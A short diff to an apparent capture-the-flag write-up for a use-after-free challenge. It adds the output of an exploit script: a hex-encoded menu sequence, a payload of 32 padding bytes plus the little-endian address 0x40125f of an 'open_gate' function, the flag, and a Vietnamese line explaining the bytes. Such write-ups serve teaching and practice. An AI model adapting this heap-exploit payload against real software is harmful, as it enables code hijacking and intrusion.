@@ -89,8 +89,15 @@ python exploit.py --host <challenge> --port <port>
 ## Flag
 
 ```
+$ python exploit.py --payload
+script menu: 310a320a330a41414141414141414141414141414141414141414141414141414141414141415f124000000000000a340a350a
+payload edit: 41414141414141414141414141414141414141414141414141414141414141415f12400000000000
+
 CSSCTF{us3_4ft3r_fr33_d0cks1d3}
 ```
+
+Bốn mươi byte của `payload edit` là 32 byte đệm cộng với `5f12400000000000`, tức `0x40125f`
+theo thứ tự little-endian - địa chỉ `open_gate`.
 
 ## Reproduce
 
